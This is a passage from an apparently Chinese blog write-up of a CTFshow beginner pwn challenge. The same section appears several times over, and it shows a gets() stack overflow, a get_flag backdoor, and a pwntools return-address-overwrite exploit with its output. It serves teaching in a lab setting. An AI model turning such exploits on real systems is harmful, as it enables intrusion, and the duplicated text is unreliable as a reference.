class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-20"><a href="#pwn36-20" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-21"><a href="#pwn36-21" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-22"><a href="#pwn36-22" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-23"><a href="#pwn36-23" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-24"><a href="#pwn36-24" class="headerlink" 